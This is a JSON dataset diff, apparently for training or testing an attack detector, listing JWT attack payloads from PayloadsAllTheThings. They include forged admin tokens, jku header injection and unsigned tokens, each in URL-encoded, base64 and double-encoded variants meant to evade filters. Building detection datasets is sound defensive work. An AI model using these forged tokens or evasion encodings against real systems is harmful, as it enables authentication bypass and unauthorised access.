+    "payload": "{\"%74yp\":\"J%57T\",\"alg\":\"RS256\", \"jku\":\"https://%65xampl%65%2Eco%6D/jwks%2E%6Ason\", \"kid\":\"id_of_%6Awks\"}.\n{\"lo%67in\":\"ad%6Din\"}.\n[%53%69%67%6Eed with new Private key; %50u%62li%63 k%65y %65%78%70orted]",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cd56878853b6b8481dfe86f41ff1455d1ff2d7b63d84601f996687a34a5ac627",
+    "original_id": "raw_jwt_00016",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key exported]",
+    "obfuscated_payload": "{\"%74yp\":\"J%57T\",\"alg\":\"RS256\", \"jku\":\"https://%65xampl%65%2Eco%6D/jwks%2E%6Ason\", \"kid\":\"id_of_%6Awks\"}.\n{\"lo%67in\":\"ad%6Din\"}.\n[%53%69%67%6Eed with new Private key; %50u%62li%63 k%65y %65%78%70orted]",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66463106,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00016__obf02",
+    "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsICJqa3UiOiJodHRwczovL2V4YW1wbGUuY29tL2p3a3MuanNvbiIsICJraWQiOiJpZF9vZl9qd2tzIn0uCnsibG9naW4iOiJhZG1pbiJ9LgpbU2lnbmVkIHdpdGggbmV3IFByaXZhdGUga2V5OyBQdWJsaWMga2V5IGV4cG9ydGVkXQ==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cd56878853b6b8481dfe86f41ff1455d1ff2d7b63d84601f996687a34a5ac627",
+    "original_id": "raw_jwt_00016",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key exported]",
+    "obfuscated_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsICJqa3UiOiJodHRwczovL2V4YW1wbGUuY29tL2p3a3MuanNvbiIsICJraWQiOiJpZF9vZl9qd2tzIn0uCnsibG9naW4iOiJhZG1pbiJ9LgpbU2lnbmVkIHdpdGggbmV3IFByaXZhdGUga2V5OyBQdWJsaWMga2V5IGV4cG9ydGVkXQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 66464115,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00016__obf03",
+    "payload": "{\"%74y%70\":\"JWT\",\"alg\":\"RS%325%36\", \"j%6B%75\":\"https://%65xamp%6C%65.com/jwks%2Ejs%6Fn\", \"kid\":\"id_of_jwks\"}%2E\n{\"%6Cog%69%6E\":\"adm%69%6E\"}%2E\n[Sign%65d %77i%74h new Private key; %50u%62lic ke%79 exported]",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cd56878853b6b8481dfe86f41ff1455d1ff2d7b63d84601f996687a34a5ac627",
+    "original_id": "raw_jwt_00016",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key exported]",
+    "obfuscated_payload": "{\"%74y%70\":\"JWT\",\"alg\":\"RS%325%36\", \"j%6B%75\":\"https://%65xamp%6C%65.com/jwks%2Ejs%6Fn\", \"kid\":\"id_of_jwks\"}%2E\n{\"%6Cog%69%6E\":\"adm%69%6E\"}%2E\n[Sign%65d %77i%74h new Private key; %50u%62lic ke%79 exported]",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66465124,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00016__obf04",
+    "payload": "%7B%22typ%22%3A%22JWT%22%2C%22%2561lg%22%3A%22RS%25325%2536%22%2C%20%22jku%22%3A%22https%3A%2F%2Fexample.co%256D%2Fjwks%252Ejson%22%2C%20%22kid%22%3A%22i%2564_%256Ff_%256Awks%22%7D.%0A%7B%22login%22%3A%22adm%2569n%22%7D.%0A%5BSigned%20with%20%256Eew%20P%2572ivate%20k%2565y%3B%20%2550u%2562%256Cic%20ke%2579%20export%2565d%5D",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00016",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cd56878853b6b8481dfe86f41ff1455d1ff2d7b63d84601f996687a34a5ac627",
+    "original_id": "raw_jwt_00016",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key exported]",
+    "obfuscated_payload": "%7B%22typ%22%3A%22JWT%22%2C%22%2561lg%22%3A%22RS%25325%2536%22%2C%20%22jku%22%3A%22https%3A%2F%2Fexample.co%256D%2Fjwks%252Ejson%22%2C%20%22kid%22%3A%22i%2564_%256Ff_%256Awks%22%7D.%0A%7B%22login%22%3A%22adm%2569n%22%7D.%0A%5BSigned%20with%20%256Eew%20P%2572ivate%20k%2565y%3B%20%2550u%2562%256Cic%20ke%2579%20export%2565d%5D",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66466133,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00017__obf01",
+    "payload": "%7B\"typ%22%3A%22JWT\"%2C\"alg\":%22RS256\"%2C%20\"jku%22%3A%22https%3A//example.com%2Fjwks.json\"%2C%20\"kid%22:\"id_of_jwks\"}.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cf70b4cd1c850a562407e8023faffa4a662a8d2b361f1915684e18c5e732944e",
+    "original_id": "raw_jwt_00017",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+    "obfuscated_payload": "%7B\"typ%22%3A%22JWT\"%2C\"alg\":%22RS256\"%2C%20\"jku%22%3A%22https%3A//example.com%2Fjwks.json\"%2C%20\"kid%22:\"id_of_jwks\"}.",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66563109,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00017__obf02",
+    "payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsICJqa3UiOiJodHRwczovL2V4YW1wbGUuY29tL2p3a3MuanNvbiIsICJraWQiOiJpZF9vZl9qd2tzIn0u",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cf70b4cd1c850a562407e8023faffa4a662a8d2b361f1915684e18c5e732944e",
+    "original_id": "raw_jwt_00017",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+    "obfuscated_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsICJqa3UiOiJodHRwczovL2V4YW1wbGUuY29tL2p3a3MuanNvbiIsICJraWQiOiJpZF9vZl9qd2tzIn0u",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66564118,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00017__obf03",
+    "payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"%68tt%70s://exa%6dple.%63om/jwks.%6Ason\", \"k%69d\":\"id_of%5fjwks\"}.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cf70b4cd1c850a562407e8023faffa4a662a8d2b361f1915684e18c5e732944e",
+    "original_id": "raw_jwt_00017",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+    "obfuscated_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"%68tt%70s://exa%6dple.%63om/jwks.%6Ason\", \"k%69d\":\"id_of%5fjwks\"}.",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "percent_hex_case"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66565127,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00017__obf04",
+    "payload": "eyJ0eXAiOiJKV1QiLCIlNjFsZyI6IlJTMjU2IiwgImolNkJ1IjoiaCU3NHRwczovL2V4JTYxbXBsJTY1LmNvbS9qJTc3a3MuJTZBcyU2RiU2RSIsICJraWQiOiJpZF9vZl9qd2tzIn0u",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00017",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "cf70b4cd1c850a562407e8023faffa4a662a8d2b361f1915684e18c5e732944e",
+    "original_id": "raw_jwt_00017",
+    "original_payload": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.",
+    "obfuscated_payload": "eyJ0eXAiOiJKV1QiLCIlNjFsZyI6IlJTMjU2IiwgImolNkJ1IjoiaCU3NHRwczovL2V4JTYxbXBsJTY1LmNvbS9qJTc3a3MuJTZBcyU2RiU2RSIsICJraWQiOiJpZF9vZl9qd2tzIn0u",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66566136,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00018__obf01",
+    "payload": "eyJhbGci%4Fi%4AIU%7AI1NiIsInR%35cCI6Ik%70XVCJ%39%2E%65%79JzdWIiOiIxMjM0NTY3ODk%77%49iwibmFtZ%53I6IkFtYXp%70bmcg%53GF4e%44ByI%69wi%5A%58hwIj%6FiM%54Q2NjI3M%44cy%4DiIsImFkb%57luIj%700cnV%6C%66Q.U%4C9P%7A5HbaM%64ZCV9c%539Ocpccj%72l%6Bc%6DLovL2A2aiKiAOY",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b8840915970728c21a61976a5337f48a0878651e38509c7773fdaef6f55a07fa",
+    "original_id": "raw_jwt_00018",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY",
+    "obfuscated_payload": "eyJhbGci%4Fi%4AIU%7AI1NiIsInR%35cCI6Ik%70XVCJ%39%2E%65%79JzdWIiOiIxMjM0NTY3ODk%77%49iwibmFtZ%53I6IkFtYXp%70bmcg%53GF4e%44ByI%69wi%5A%58hwIj%6FiM%54Q2NjI3M%44cy%4DiIsImFkb%57luIj%700cnV%6C%66Q.U%4C9P%7A5HbaM%64ZCV9c%539Ocpccj%72l%6Bc%6DLovL2A2aiKiAOY",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66663112,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00018__obf02",
+    "payload": "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnpkV0lpT2lJeE1qTTBOVFkzT0Rrd0lpd2libUZ0WlNJNklrRnRZWHBwYm1jZ1NHRjRlREJ5SWl3aVpYaHdJam9pTVRRMk5qSTNNRGN5TWlJc0ltRmtiV2x1SWpwMGNuVmxmUS5VTDlQejVIYmFNZFpDVjljUzlPY3BjY2pybGtjbUxvdkwyQTJhaUtpQU9Z",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b8840915970728c21a61976a5337f48a0878651e38509c7773fdaef6f55a07fa",
+    "original_id": "raw_jwt_00018",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY",
+    "obfuscated_payload": "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnpkV0lpT2lJeE1qTTBOVFkzT0Rrd0lpd2libUZ0WlNJNklrRnRZWHBwYm1jZ1NHRjRlREJ5SWl3aVpYaHdJam9pTVRRMk5qSTNNRGN5TWlJc0ltRmtiV2x1SWpwMGNuVmxmUS5VTDlQejVIYmFNZFpDVjljUzlPY3BjY2pybGtjbUxvdkwyQTJhaUtpQU9Z",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 66664121,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00018__obf03",
+    "payload": "ey%4AhbG%63iOiJIUzI1%4E%69Is%49nR5%63CI6IkpX%56CJ9.%65yJ%7AdWIi%4FiIxMjM0%4ETY3OD%6BwIiwibmFt%5ASI6IkFtYXp%70b%6DcgSGF4eD%42%79IiwiZX%68wIjoi%4DTQ%32NjI3MD%63yMiIsIm%46k%62Wlu%49jp0cn%56lfQ.UL9Pz5HbaM%64ZCV9cS%39O%63pccjrl%6BcmLovL%32A2aiKi%41%4FY",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b8840915970728c21a61976a5337f48a0878651e38509c7773fdaef6f55a07fa",
+    "original_id": "raw_jwt_00018",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY",
+    "obfuscated_payload": "ey%4AhbG%63iOiJIUzI1%4E%69Is%49nR5%63CI6IkpX%56CJ9.%65yJ%7AdWIi%4FiIxMjM0%4ETY3OD%6BwIiwibmFt%5ASI6IkFtYXp%70b%6DcgSGF4eD%42%79IiwiZX%68wIjoi%4DTQ%32NjI3MD%63yMiIsIm%46k%62Wlu%49jp0cn%56lfQ.UL9Pz5HbaM%64ZCV9cS%39O%63pccjrl%6BcmLovL%32A2aiKi%41%4FY",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66665130,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00018__obf04",
+    "payload": "eyJhbGciOiJI%2555zI%2531NiIs%2549nR5cCI6I%256BpXVCJ9.e%2579Jz%2564WIiOiIxMjM0NTY3ODkwIiw%2569bmFtZSI6IkFtYX%2570pbmcgSGF4eDByIiwiZXhwI%256AoiMT%2551%2532N%256AI3%254DDcyMiIsImFkbW%256CuIjp%2530c%256EVlfQ.UL9Pz5HbaMdZC%25569c%25539Ocpccj%2572lkcmLo%2576L2A%2532aiKiAOY",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00018",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b8840915970728c21a61976a5337f48a0878651e38509c7773fdaef6f55a07fa",
+    "original_id": "raw_jwt_00018",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY",
+    "obfuscated_payload": "eyJhbGciOiJI%2555zI%2531NiIs%2549nR5cCI6I%256BpXVCJ9.e%2579Jz%2564WIiOiIxMjM0NTY3ODkwIiw%2569bmFtZSI6IkFtYX%2570pbmcgSGF4eDByIiwiZXhwI%256AoiMT%2551%2532N%256AI3%254DDcyMiIsImFkbW%256CuIjp%2530c%256EVlfQ.UL9Pz5HbaMdZC%25569c%25539Ocpccj%2572lkcmLo%2576L2A%2532aiKiAOY",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66666139,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00019__obf01",
+    "payload": "eyJhbGci%4FiJ%49%55%7AI1NiIsInR5cCI%36IkpXVCJ9.eyJz%64WIiOiIx%4Dj%4D0NTY3ODkwIiwibmFtZSI6IkpvaG4gR%47%39%6CI%69wi%61W%460I%6AoxNTE%32%4DjM%35M%44IyfQ.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b295b46eca7f6cf2c5aa5fab91907bcb361fbeb9d2c6b60ddc55406740d22b21",
+    "original_id": "raw_jwt_00019",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "obfuscated_payload": "eyJhbGci%4FiJ%49%55%7AI1NiIsInR5cCI%36IkpXVCJ9.eyJz%64WIiOiIx%4Dj%4D0NTY3ODkwIiwibmFtZSI6IkpvaG4gR%47%39%6CI%69wi%61W%460I%6AoxNTE%32%4DjM%35M%44IyfQ.",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66763115,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00019__obf02",
+    "payload": "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnpkV0lpT2lJeE1qTTBOVFkzT0Rrd0lpd2libUZ0WlNJNklrcHZhRzRnUkc5bElpd2lhV0YwSWpveE5URTJNak01TURJeWZRLg==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b295b46eca7f6cf2c5aa5fab91907bcb361fbeb9d2c6b60ddc55406740d22b21",
+    "original_id": "raw_jwt_00019",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "obfuscated_payload": "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnpkV0lpT2lJeE1qTTBOVFkzT0Rrd0lpd2libUZ0WlNJNklrcHZhRzRnUkc5bElpd2lhV0YwSWpveE5URTJNak01TURJeWZRLg==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 66764124,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00019__obf03",
+    "payload": "eyJhbGciOi%4AIUzI1NiIs%49nR%35cCI6%49kp%58VCJ9==.%65yJzdWI%69OiIxMjM0NTY%33O%44k%77I%69%77ibmF%74ZSI6IkpvaG4%67RG9l%49iwiaWF0Ijox%4ETE2MjM5M%44IyfQ==.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b295b46eca7f6cf2c5aa5fab91907bcb361fbeb9d2c6b60ddc55406740d22b21",
+    "original_id": "raw_jwt_00019",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "obfuscated_payload": "eyJhbGciOi%4AIUzI1NiIs%49nR%35cCI6%49kp%58VCJ9==.%65yJzdWI%69OiIxMjM0NTY%33O%44k%77I%69%77ibmF%74ZSI6IkpvaG4%67RG9l%49iwiaWF0Ijox%4ETE2MjM5M%44IyfQ==.",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 66765133,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00019__obf04",
+    "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ%253D%253D.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00019",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "b295b46eca7f6cf2c5aa5fab91907bcb361fbeb9d2c6b60ddc55406740d22b21",
+    "original_id": "raw_jwt_00019",
+    "original_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+    "obfuscated_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ%253D%253D.",
+    "obfuscation_chain": [
+      "jwt_padding",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 66766142,
+    "equivalence_scope": "normalization-layer-dependent"
+  }
+]
